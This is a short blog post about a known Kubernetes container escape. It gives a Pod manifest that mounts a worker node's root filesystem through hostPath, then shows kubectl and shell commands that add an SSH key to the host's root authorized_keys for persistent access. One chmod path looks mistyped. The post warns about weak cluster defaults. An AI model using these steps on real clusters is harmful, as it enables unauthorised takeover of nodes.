---
title: Fiddling with Kubernetes worker nodes
type: post
tags: [ kubernetes, security ]
comment: true
date: 2022-01-31 07:00:00 +0100
mathjax: false
published: true
---

**TL;DR**

> I needed to put some files into Worker Nodes in a [Kubernetes][]
> cluster and, **unfortunately**, I could do it.

Although, admittedly, was no surprise.

Containers are not primarily about ensuring strong isolation, but more
on allowing good citizens share some infrastructure with way to avoid
treading onto each other's feet.

So, in a *basic* cluster where containers are allowed to run as `root`,
and mounting host directory is open too, it's easy to run a Pod that
gives us access to the hosts's root directory.

This is described in [Kubernetes Container Escape With HostPath
Mounts][], and the gist of it is to run a Pod in the specific target
worker node (`worker01` in the example below):

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: horse01
spec:
  nodeName: worker01
  containers:  
  - image: alpine
    name: test-container
    command: ["tail"]
    args: ["-f", "/dev/null"] 
    volumeMounts:
    - mountPath: /host
      name: da-root-folks
  volumes:
  - name: da-root-folks
    hostPath:
      path: /
      type: Directory
```

Run that, and if your cluster is not specifically meant for enforcing
security, you're basically in:

```
$ kubectl apply -f t-horse.yaml

$ kubectl exec -it horse01 -- /bin/sh
```

Now the host's filesystem is accessible at `/host`... happy fiddling!

```
cntnr$ mkdir -p /host/root/.ssh
cntnr$ vi /host/root/.ssh/authorized_keys # add a public key...
cntnr$ chmod og-rwx /home/root/.ssh /host/root/.ssh/authorized_keys
```

Now `ssh` should work too.

Stay safe folks!

[Kubernetes]: https://www.kubernetes.io/
[Kubernetes Container Escape With HostPath Mounts]: https://infosecwriteups.com/kubernetes-container-escape-with-hostpath-mounts-d1b86bd2fa3
[specific-node]: https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node
